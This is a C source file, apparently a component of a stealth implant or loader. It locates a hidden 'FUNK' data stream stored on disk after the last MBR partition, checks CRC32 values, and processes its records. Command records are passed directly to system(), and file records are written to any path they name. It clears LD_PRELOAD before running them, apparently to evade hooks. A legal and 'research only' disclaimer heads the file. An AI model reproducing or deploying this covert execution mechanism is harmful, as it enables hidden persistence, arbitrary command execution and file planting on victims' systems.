/*
 * Copyright (C) 2025 ff794e44ea1c2b5211a3b07c57b5a3813f87f53ac10d78e56b16b79db6ff9615
 *                    b726ae7cf45cc4dfa8de359caffb893209bca614d9387a7666b106052fba3e50
 *
 * This program is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation, either version 3 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program. If not, see <https://www.gnu.org/licenses/>.
 *
 * DMCA Security Research Exemption:
 * Good faith security research performed consistent with 17 U.S.C. §1201(j) and
 * 37 CFR §201.40(b)(7) is explicitly permitted.
 *
 * This software is intended solely for educational, forensic, and lawful
 * security research purposes. Any use of this software for offensive or harmful
 * purposes is strictly prohibited.
 *
 * GENERAL DISCLAIMER:
 * This program is distributed WITHOUT ANY WARRANTY or guarantee of suitability.
 * The author explicitly disclaims responsibility and liability for any direct,
 * indirect, incidental, or consequential damages resulting from use or misuse.
 * Users accept all risks associated with use or distribution.
 *
 * Use, modification, or distribution constitutes explicit agreement to all terms
 * above.
 */

#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>

#include "debug.h"
#include "loader.h"


#define FUNK_HEADER_SIZE 268
#define TLV_TYPE_COMMAND 1
#define TLV_TYPE_FILE    2


typedef struct {
    unsigned char *data;
    size_t size;
} funk_thread_args;

#define SECTOR_SIZE 512
#define MBR_PARTITION_TABLE_OFFSET 0x1BE
#define MBR_PARTITION_ENTRY_SIZE   16
#define NUM_PARTITIONS             4

#pragma pack(push, 1)
typedef struct {
    uint8_t  status;
    uint8_t  chs_first[3];
    uint8_t  partition_type;
    uint8_t  chs_last[3];
    uint32_t lba_first;
    uint32_t num_sectors;
} mbr_partition_entry;
#pragma pack(pop)

static uint32_t crc32_table[256];

static void crc32_init(void)
{
    uint32_t i;
    int j;
    const uint32_t polynomial = 0xEDB88320u;
    for (i = 0; i < 256; i++) {
        uint32_t c = i;
        for (j = 0; j < 8; j++) {
            if (c & 1)
                c = polynomial ^ (c >> 1);
            else
                c = c >> 1;
        }
        crc32_table[i] = c;
    }
}

static uint32_t crc32_update(uint32_t crc, const void *data, size_t len)
{
    const unsigned char *buf = (const unsigned char *)data;
    while (len--) {
        uint32_t index = (crc ^ *buf++) & 0xFF;
        crc = (crc >> 8) ^ crc32_table[index];
    }
    return crc;
}

static uint32_t crc32_compute(const void *data, size_t len)
{
    uint32_t crc = 0xFFFFFFFFu;
    crc = crc32_update(crc, data, len);
    crc ^= 0xFFFFFFFFu;
    return crc;
}

static uint32_t read_le32(const unsigned char *buf)
{
    return (uint32_t)buf[0]
         | ((uint32_t)buf[1] << 8)
         | ((uint32_t)buf[2] << 16)
         | ((uint32_t)buf[3] << 24);
}

/*
 * parse_and_process_funk_data:
 * Parses the FUNK structure and processes each TLV:
 *   - TLV_TYPE_COMMAND -> system()
 *   - TLV_TYPE_FILE    -> write file to disk
 */
static int parse_and_process_funk_data(const unsigned char *data, size_t size)
{
    size_t offset;
    uint32_t total_length;
    uint32_t stored_hdr_crc;
    uint32_t computed_hdr_crc;
    unsigned char header_copy[FUNK_HEADER_SIZE];

    if (size < FUNK_HEADER_SIZE) {
        debug_fprintf(stderr, "[!] FUNK data smaller than 268 bytes.\n");
        return -1;
    }

    if (memcmp(data, "FUNK", 4) != 0) {
        debug_fprintf(stderr, "[!] FUNK: Not found!\n");
        return -1;
    }

    total_length = read_le32(data + 4);
    if (total_length > size) {
        debug_fprintf(stderr, "[!] FUNK: total_length=%u, but we only have %zu bytes\n",
                total_length, size);
        return -1;
    }

    stored_hdr_crc = read_le32(data + 8);
    memcpy(header_copy, data, FUNK_HEADER_SIZE);
    memset(header_copy + 8, 0, 4);

    computed_hdr_crc = crc32_compute(header_copy, FUNK_HEADER_SIZE);
    if (computed_hdr_crc != stored_hdr_crc) {
        debug_fprintf(stderr, "[!] FUNK: header CRC mismatch (stored=0x%08X, computed=0x%08X)\n",
                stored_hdr_crc, computed_hdr_crc);
        return -1;
    }

    debug_fprintf(stderr, "[*] FUNK Header OK. total_length=%u\n", total_length);

    offset = FUNK_HEADER_SIZE;
    while (offset + 8 <= total_length)
    {
        const unsigned char *tlv_hdr = data + offset;
        uint32_t tlv_type   = read_le32(tlv_hdr + 0);
        uint32_t tlv_length = read_le32(tlv_hdr + 4);
        offset += 8;

        if (offset + tlv_length + 4 > total_length) {
            debug_fprintf(stderr, "[!] Truncated TLV (type=%u, length=%u)\n",
                    tlv_type, tlv_length);
            return -1;
        }

        const unsigned char *payload = data + offset;
        const unsigned char *crc_ptr = data + offset + tlv_length;
        offset += (tlv_length + 4);

        uint32_t stored_crc = read_le32(crc_ptr);
        uint32_t computed_crc = crc32_compute(payload, tlv_length);
        if (stored_crc != computed_crc) {
            debug_fprintf(stderr, "[!] TLV CRC mismatch (type=%u)\n", tlv_type);
            return -1;
        }

        debug_fprintf(stderr, "[*] FUNK: TLV found: type=%u, length=%u\n", tlv_type, tlv_length);

        if (tlv_type == TLV_TYPE_COMMAND) {
            size_t cmd_size = (tlv_length < 1024) ? tlv_length : 1024;
            char cmd[1025];
            memcpy(cmd, payload, cmd_size);
            cmd[cmd_size] = '\0'; // ensure termination

            debug_fprintf(stderr, "[*] FUNK: [COMMAND] '%s'\n", cmd);
            int ret = system(cmd);
            debug_fprintf(stderr, "[*]  system() returned %d\n", ret);

        } else if (tlv_type == TLV_TYPE_FILE) {
            if (tlv_length < 1024) {
                debug_fprintf(stderr, "  [FILE] Malformed (payload < 1024 bytes)\n");
                continue;
            }
            char dest[1025];
            memcpy(dest, payload, 1024);
            dest[1024] = '\0';

            size_t file_data_len = tlv_length - 1024;
            const unsigned char *file_data = payload + 1024;

            debug_fprintf(stderr, "  [FILE] destination='%s', file_size=%zu\n", dest, file_data_len);

            FILE *outf = fopen(dest, "wb");
            if (!outf) {
                debug_perror("fopen for writing file");
                continue;
            }

            size_t written = fwrite(file_data, 1, file_data_len, outf);
            fclose(outf);

            debug_fprintf(stderr, "  Wrote %zu/%zu bytes to '%s'\n", written, file_data_len, dest);

        } else {
            debug_fprintf(stderr, "  [Unknown TLV type=%u]\n", tlv_type);
        }
    }

    debug_fprintf(stderr, "\nDone processing FUNK.\n");
    return 0;
}

static void *funk_thread_func(void *arg)
{
    funk_thread_args *info = (funk_thread_args *)arg;

    const char *ld_preload = getenv("LD_PRELOAD");
    if (ld_preload != NULL) {
        unsetenv("LD_PRELOAD");
    }

    parse_and_process_funk_data(info->data, info->size);

    free(info->data);
    free(info);

    return NULL;
}

int read_hidden_stream(const char *device_path)
{
    int i;
    unsigned char mbr[SECTOR_SIZE];
    unsigned char funk_header[FUNK_HEADER_SIZE];

    crc32_init();

    int fd = open(device_path, O_RDWR);
    if (fd < 0) {
        debug_perror("open");
        return EXIT_FAILURE;
    }

    ssize_t bytes_read = pread(fd, mbr, SECTOR_SIZE, 0);
    if (bytes_read != SECTOR_SIZE) {
        debug_perror("pread MBR");
        close(fd);
        return EXIT_FAILURE;
    }

    uint64_t max_end_sector = 0;
    for (i = 0; i < NUM_PARTITIONS; i++)
    {
        const unsigned char *entry = mbr + MBR_PARTITION_TABLE_OFFSET + i * MBR_PARTITION_ENTRY_SIZE;
        uint32_t lba_first = read_le32(entry + 8);
        uint32_t num_sectors = read_le32(entry + 12);

        debug_fprintf(stderr, "FUNK: partition %d: start=%u, size=%u\n",
            i, lba_first, num_sectors);

        if (num_sectors > 0) {
            uint64_t end = (uint64_t)lba_first + num_sectors - 1;
            if (end > max_end_sector) {
                max_end_sector = end;
            }
        }
    }

    uint64_t funk_offset = (max_end_sector + 1) * SECTOR_SIZE;
    debug_fprintf(stderr, "FUNK offset = %llu\n", (unsigned long long)funk_offset);

    bytes_read = pread(fd, funk_header, FUNK_HEADER_SIZE, funk_offset);

    if (bytes_read < 0) {
        debug_perror("pread FUNK header");
        close(fd);
        return EXIT_FAILURE;
    } else if (bytes_read < FUNK_HEADER_SIZE) {
        debug_fprintf(stderr, "Not enough data for FUNK header.\n");
        close(fd);
        return EXIT_FAILURE;
    }

    if (memcmp(funk_header, "FUNK", 4) != 0) {
        debug_fprintf(stderr, "Invalid or missing 'FUNK' magic.\n");
        close(fd);
        return EXIT_FAILURE;
    }

    uint32_t total_length = read_le32(funk_header + 4);
    unsigned char *funk_data = (unsigned char *)malloc(total_length);
    if (!funk_data) {
        debug_fprintf(stderr, "Out of memory (need %u bytes)\n", total_length);
        close(fd);
        return EXIT_FAILURE;
    }

    bytes_read = pread(fd, funk_data, total_length, funk_offset);
    close(fd);
    if (bytes_read < 0) {
        debug_perror("pread FUNK data");
        free(funk_data);
        return EXIT_FAILURE;
    }
    if ((uint32_t)bytes_read < total_length) {
        debug_fprintf(stderr, "FUNK data incomplete: got %zd, needed %u\n", bytes_read, total_length);
        free(funk_data);
        return EXIT_FAILURE;
    }

    pthread_t tid;
    funk_thread_args *args = malloc(sizeof(*args));
    if (!args) {
        debug_fprintf(stderr, "Out of memory for thread args.\n");
        free(funk_data);
        return EXIT_FAILURE;
    }
    args->data = funk_data;
    args->size = total_length;

    int rc = pthread_create(&tid, NULL, funk_thread_func, args);
    if (rc != 0) {
        debug_fprintf(stderr, "pthread_create failed, rc=%d\n", rc);
        free(args);
        free(funk_data);
        return EXIT_FAILURE;
    }

    pthread_join(tid, NULL);

    return EXIT_SUCCESS;
}
